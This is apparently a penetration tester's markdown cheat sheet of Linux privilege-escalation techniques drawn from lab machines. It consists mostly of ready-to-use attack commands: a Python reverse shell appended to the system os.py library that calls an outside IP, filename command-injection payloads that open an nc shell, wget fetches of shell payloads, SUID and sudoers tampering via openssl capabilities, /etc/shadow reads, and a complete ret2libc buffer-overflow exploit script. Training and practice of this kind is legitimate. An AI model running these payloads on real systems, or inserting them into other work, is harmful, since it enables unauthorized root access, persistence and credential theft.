# Linux Priv escalation Tips

# ${{\color{purple}Upgrade shell}}\ $

`python -c 'import pty; pty.spawn("/bin/bash")'`

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

# ${{\color{purple}Upgrade shell : Part 2}}\ $

``rlwrap nc -nlvp 1234``

``export TERM=xterm``

``stty -a``

``stty rows 54``

``stty cols 111``

``stty raw -echo;fg``

# ${{\color{purple}Manual testing}}\ $
# ${{\color{green}sudo -l}}\ $

`sudo -l`

![1](https://user-images.githubusercontent.com/123066149/225001578-46a486b7-bf12-44ef-b52d-1408ef34fb1e.PNG)

`sudo -u scriptmanager /bin/bash`

![image](https://user-images.githubusercontent.com/123066149/225002081-e468220b-fddf-493b-a817-7d64b90accc1.png)

# ${{\color{green}tmux}}\ $

``cat .bash_history``

![image](https://user-images.githubusercontent.com/123066149/226274014-d15271f8-178e-4891-9a3a-7e7fba239035.png)

``ps aux | grep -i tmux``

![image](https://user-images.githubusercontent.com/123066149/226274186-eb4fb8f5-1e4b-4752-ac3d-3fe6e9889d3d.png)

``ls -la /.devs/dev_ses``

![image](https://user-images.githubusercontent.com/123066149/226274516-f2a84f6f-121b-44b6-85c2-84cbb944435a.png)

``export TERM=xterm``
``tmux -S /.devs/dev_sess``

![image](https://user-images.githubusercontent.com/123066149/226274864-b5db7a5e-f19f-4854-929f-aa2f491ae328.png)
![image](https://user-images.githubusercontent.com/123066149/226275042-06bc4a86-474e-486f-a4e4-00ac3e2e4950.png)

# ${{\color{green}crontab : }}\ $

### After my enumeration i found this script :

![image](https://user-images.githubusercontent.com/123066149/230378975-d4df5a28-03e3-4040-95c5-0ff5b3d5b2d4.png)

### Pspy confirm me that this script run with a crontab :

![image](https://user-images.githubusercontent.com/123066149/230383159-98abc3b3-cb09-4f3a-8dcd-65f64fb1c8f2.png)

![image](https://user-images.githubusercontent.com/123066149/230382964-32169402-f2b1-4cf8-8b25-64b0e55678cf.png)

### We can edit the script and execute command :
### But regular rev shell are not working we have /bin/dash on the machine we will ad chmod 4755 to this binary :

``os.system('chmod 4755 /bin/dash')``

![image](https://user-images.githubusercontent.com/123066149/230384009-2578821d-9f32-483f-95fd-debe8e5cb87e.png)

``date``

``ls -lah /bin/dash``

![image](https://user-images.githubusercontent.com/123066149/230384123-a6526df4-21bd-48cc-b2df-bb13f070ff59.png)

![image](https://user-images.githubusercontent.com/123066149/230384619-80051ff2-7aab-4595-9208-5a80f9326f52.png)

``/bin/dash``

### And we are root :
 
![image](https://user-images.githubusercontent.com/123066149/230385136-1a3f0f26-5b4a-4cb4-ba99-e07374157c21.png)

# ${{\color{green}crontab + lib os}}\ $

``ls /opt``

![image](https://user-images.githubusercontent.com/123066149/227714929-a9d3bf80-7aed-465e-b1cc-0bdc72116b0a.png)

![image](https://user-images.githubusercontent.com/123066149/227715049-c670f729-a237-4a63-b208-826d06931d66.png)

``cd /usr/lib``

![image](https://user-images.githubusercontent.com/123066149/227715097-471f6bf7-c430-4469-9b17-11bd4a4baaa3.png)

### I added a reverse shell to end of the library ``/usr/lib/python2.7/os.py``

``import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.3",4455))
dup2(s.fileno(),0) 
dup2(s.fileno(),1)
dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")``

![image](https://user-images.githubusercontent.com/123066149/227715198-26be459a-977a-4b3d-bd81-e6e10ee4c6c8.png)

### As soon as the crontab runs I am root :

![image](https://user-images.githubusercontent.com/123066149/227715364-37deff06-5fa2-4b2b-94ef-baf5fddc6deb.png)

# ${{\color{green}crontab + exec() fonction }}\ $

### Browsing to the home folder of the user, two files named check_attack.php and crontab.guly are
### found.

![image](https://user-images.githubusercontent.com/123066149/227843320-a1b71d72-746c-4e17-b4f5-86e265ca86f9.png)

### Here are the contents of the check_attack.php file:

![image](https://user-images.githubusercontent.com/123066149/227844068-b8db5212-4a6f-4750-a795-26b2d0caf341.png)

### The script lists files in the /uploads folder and checks if it is valid based on filename. Any invalid
### files are removed using the system exec() function

![image](https://user-images.githubusercontent.com/123066149/227844227-1976b7a1-48f0-4c01-a085-fb9797b432de.png)

### The $value variable stores the filename, but isn’t sanitized by the script, which means that we can
### inject commands through special file names. For example, a file named “; cmd” will result in the
### command:

![image](https://user-images.githubusercontent.com/123066149/227844740-539c6b45-6e74-4567-9540-b191b026b398.png)

``touch -- ';ping -c 3 10.10.16.3;.php'``

![image](https://user-images.githubusercontent.com/123066149/227845494-d10710e3-4933-48f8-8e2c-a21432e1a0c5.png)

![image](https://user-images.githubusercontent.com/123066149/227846087-d38a33ba-4258-4c9c-89fe-eb9ec5c5e2cc.png)

``touch -- ';nc -c sh 10.10.16.3 5000;.php'``

![image](https://user-images.githubusercontent.com/123066149/227846212-c4f52290-2b68-48bb-b91a-4d7130e08c0d.png)

#### Looking at the sudo privileges, we see that guly can execute changename.sh as root.

![image](https://user-images.githubusercontent.com/123066149/227846847-5740d7e8-5a43-4e94-9b37-bdc8bd2fe270.png)

https://seclists.org/fulldisclosure/2019/Apr/24

``sudo -l``

![image](https://user-images.githubusercontent.com/123066149/227845992-a2b2c4a3-fb09-461b-bcb1-4d12bec8eec1.png)

### The script creates a configuration for the guly0 network interface and uses “ifup guly0” to
### activate it at the end. The user input is validated, and only alphanumeric characters, slashes or a
### dash are allowed. Network configuration scripts on CentOS are vulnerable to command injection
### through the attribute values as described here. This is because the scripts are sourced by the
### underlying service, leading to execution of anything after a space.
### We can exploit this by executing /bin/bash as root

# ${{\color{green}SUID Files : Nmap}}\ $

![Capture](https://user-images.githubusercontent.com/123066149/227937810-a6bcdf41-9acc-4de4-8f0c-bd322b5b097b.PNG)

``nmap --interactive``

``!sh``

![2](https://user-images.githubusercontent.com/123066149/227937822-b62c4470-c943-486e-aa74-2de73ae958b9.PNG)

# ${{\color{green}SUID Files : systemctl}}\ $

### Create shell.sh file :

![image](https://user-images.githubusercontent.com/123066149/229596855-af214984-801f-4f86-9ae0-d1c8cefb528a.png)

### Create shell.service file :
### Execstart will execute the shell you need to adapt this part :

![image](https://user-images.githubusercontent.com/123066149/229596962-270993f1-1664-463b-b47f-6a442f1618e0.png)

``wget http://10.10.14.9:80/shell.service && chmod +x  shell.service``

``wget http://10.10.14.9:80/shell.sh && chmod +x  shell.sh``

``systemctl link /home/pepper/shell.service``

``systemctl enable --now shell.service``

![2023-04-03 20_38_02-kali-linux-2022 4-vmware-amd64 - VMware Workstation](https://user-images.githubusercontent.com/123066149/229597833-52860ee3-8cde-4485-9c69-ecd3f93ee1ec.png)

# ${{\color{green}SUID Files : openssl}}\ $

![image](https://user-images.githubusercontent.com/123066149/230097354-bfead45a-4da0-44d6-8ec0-c9908e221ea0.png)

``getcap *``

### ep = all acpability cela permet d'effectuer l'elevation des privilèges :

![image](https://user-images.githubusercontent.com/123066149/230096352-9df56fed-6be5-4290-a48e-32a591a19815.png)

``man capabilites``

![image](https://user-images.githubusercontent.com/123066149/230097488-fbb14914-e109-4482-9bd1-2c3e8d520ef3.png)

![image](https://user-images.githubusercontent.com/123066149/230097825-d97dea8e-e609-425c-b470-1acde7f6ec08.png)

``./openssl enc -in /etc/shadow``

![image](https://user-images.githubusercontent.com/123066149/230098099-85b70a6f-a841-4739-b05f-f8b5b5985d59.png)

``./openssl enc -in /etc/sudoers > sudoers``

![image](https://user-images.githubusercontent.com/123066149/230098782-293ab9dc-8202-4a0b-a847-bc9800c3b69f.png)

### Edit the sudoers file with vi or nano :

![image](https://user-images.githubusercontent.com/123066149/230099786-d8d76c62-2d2c-4ae3-8f38-bc43b65b140b.png)

### Cat the file and put the file in /etc/sudoers :

 ``cat ./sudoers | ./openssl enc -out /etc/sudoers``
 
 ![image](https://user-images.githubusercontent.com/123066149/230100637-bf027fd7-3562-4216-8639-46cdcef8257c.png)

 ``sudo su``
 
 ![image](https://user-images.githubusercontent.com/123066149/230100868-6a831a4e-8df6-4d08-9708-33e2493c0b8a.png)


# ${{\color{green}GIT : git}}\ $

`` find . -name git``

`` find . -name .git``

![image](https://user-images.githubusercontent.com/123066149/229842575-d9c474e0-5868-4baf-82ff-798b742ea048.png)

``git log``

![image](https://user-images.githubusercontent.com/123066149/229842861-d11ea991-dad1-48ad-ab79-4b70c3df9e6a.png)

### Don't go in the .git directory :

![image](https://user-images.githubusercontent.com/123066149/229843514-e98717a1-ae59-40e2-8c25-497748a1010b.png)

``git diff d387abf63e05c9628a59195cec9311751bdb283f``

![image](https://user-images.githubusercontent.com/123066149/229843761-7deec5b6-e1fd-4b8b-acd4-8f5403f93316.png)

``chmod 600``

``ssh -i privatekey root@ip``

![image](https://user-images.githubusercontent.com/123066149/229844331-aef01eab-da3e-49df-8368-c1dc10b42269.png)


# ${{\color{green}Buffer : Bypass ASLR}}\ $


``find / -perm -4000 2>/dev/null``

![image](https://user-images.githubusercontent.com/123066149/228848043-e31e5e3a-e793-4f11-8e72-3cd151bb67ff.png)

### Transfert file from client to kali

``nc -w 5 10.10.14.3 999 < /usr/local/bin/ovrflw``

``nc -l -p 999 > ovrfl``

![image](https://user-images.githubusercontent.com/123066149/228850260-f2eabad3-353c-4757-83b9-52b18d1d9a92.png)

### Check integrity:

``md5sum ovflw ``

![image](https://user-images.githubusercontent.com/123066149/228850724-35bd36f6-0ddd-4f8c-8bb7-30472dc50f50.png)

### Check kernel version:

``uname -a ``

![image](https://user-images.githubusercontent.com/123066149/228850943-6b897819-d22e-4c2c-a667-90a9f193c75a.png)

``cat /etc/lsb-release``

![image](https://user-images.githubusercontent.com/123066149/228850983-e5219221-7604-4f83-ac42-eeb87c148b9a.png)

![image](https://user-images.githubusercontent.com/123066149/228851291-86389ba2-23d9-4982-93f9-9bc4544c026f.png)

``/usr/local/bin/ovrflw``

![image](https://user-images.githubusercontent.com/123066149/228851397-4db84aab-b7d8-438c-b94f-75d7ab251710.png)

``gdb ovrfl``

``disas main``

![image](https://user-images.githubusercontent.com/123066149/228851968-26270622-8120-446d-846e-23d5ad02dbd0.png)

``msf-pattern_create -l 300``

![image](https://user-images.githubusercontent.com/123066149/228852426-077a99ae-7fac-4fad-956c-e9aced1953c4.png)

![image](https://user-images.githubusercontent.com/123066149/228852654-a2249290-a840-4a6f-b924-265731a8b713.png)

![image](https://user-images.githubusercontent.com/123066149/228948787-fdb9da19-c7d3-4e21-9a6a-3fce64a43c4e.png)

![image](https://user-images.githubusercontent.com/123066149/228948867-48228b79-0142-4535-90d6-2d3629a51438.png)

### Get system address

``p system``

### Check ASLR

``ldd /usr/local/bin/ovrflw | grep libc`` 


![image](https://user-images.githubusercontent.com/123066149/228949233-724b39da-cd64-49a7-be5b-31443bf8c213.png)


### Find system address :

``readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system``

![image](https://user-images.githubusercontent.com/123066149/228949395-2beecb7d-3929-44ec-855e-604195002920.png)

### Find exit address :

``readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit``

![image](https://user-images.githubusercontent.com/123066149/228949547-9236cd8b-52e2-43db-847d-37d20999e552.png)

### Find /bin/sh address :

``strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh``

![image](https://user-images.githubusercontent.com/123066149/228949734-9e4e3f38-e4fb-4eb7-a9e4-cb9c3b3a7b94.png)

### The exploit :

![image](https://user-images.githubusercontent.com/123066149/228950185-e462d734-0323-4e7c-ba7a-6949d30c7bd1.png)


#!/usr/bin/python3

from struct import pack
from subprocess import call

offset = 112
junk = b"A"*offset

#ret2libc -> system_addr + exit_addr + bin_sh_addr

base_libc_addr = 0xb7602000

system_addr_off = 0x00040310
exit_addr_off = 0x00033260
bin_sh_addr_off = 0x00162bac

system_addr = pack("<L", base_libc_addr + system_addr_off)
exit_addr = pack("<L",base_libc_addr + exit_addr_off)
bin_sh_addr = pack("<L", base_libc_addr + bin_sh_addr_off)

payload = junk + system_addr + exit_addr + bin_sh_addr

while True:
        ret = call(["/usr/local/bin/ovrflw", payload])

![image](https://user-images.githubusercontent.com/123066149/228951637-17575ac8-fadd-452c-85f2-dba0fdf82327.png)

# ${{\color{green}UPLOAD : GDB PEDA}}\ $

``tar -xvf peda.tar /dir/``

``wget http://10.10.14.3:80/peda.tar ``

``tar -xf peda.tar``

``rm peda.tar``

``echo $HOME``

``export HOME=/tmp``

``cd /``

``echo "source ~/peda/peda.py" >> ~/.gdbinit``


# ${{\color{purple}Script}}\ $
# ${{\color{green}LinPeas}}\ $

https://github.com/carlospolop/PEASS-ng/releases/tag/20230319

# ${{\color{green}LinEnum}}\ $

https://github.com/rebootuser/LinEnum

# ${{\color{green}Linux-Exploit-Suggester}}\ $

https://github.com/The-Z-Labs/linux-exploit-suggester

# ${{\color{green}Pspy}}\ $

https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1

